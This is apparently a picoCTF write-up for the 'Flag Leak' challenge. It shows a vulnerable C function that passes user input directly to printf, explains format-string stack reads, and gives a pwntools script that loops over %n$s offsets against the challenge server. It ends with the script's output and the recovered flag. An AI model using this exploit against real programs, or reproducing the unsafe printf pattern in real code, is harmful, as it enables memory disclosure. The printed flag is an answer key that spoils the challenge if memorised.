# Flag Leak

## Overview:

Category: Binary Exploitation
Points: 300

## Description

Story telling class 1/2
I'm just copying and pasting with this program. What can go wrong? You can view source here [vuln.c](./vuln.c). And connect with it using: `nc saturn.picoctf.net 57625`

## Hints

1. Format Strings

## Approach

We can identify a weakness in the source code.

Take a look at 

```c
void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}
```

and notice the `printf(story);`
We can abuse this to print values off of the stack using a format string. 
`%x$s` allows us to print the value at the x'th offset of the stack as a string.
And we know that the flag is on the stack by the readflag function.

## Attack

```c
from pwn import *

context.log_level = 'error'
print("[+] Starting script")

for i in range(60):
    #p = process("./vuln")
    p = remote("saturn.picoctf.net", 57625)
    p.sendlineafter(b'>>', b"%" + str(i).encode() + b"$s")
    response = p.recvall()
    if b'{' in response:
        print(response)
        print("[+] Answer found")
        break

```

The purpose of this [script](./script.py) is to connect to the shell and print every value up until 60 (60 should be sufficient)


```text
$ python script.py
    [+] Starting script
    b" Here's a story - \nCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}\n"
    [+] Answer found
```

Here we can see partial of the flag, and we can complete it ourselves by adding the 'pico'.

## Flag

picoCTF{L34k1ng_Fl4g_0ff_St4ck_999e2824}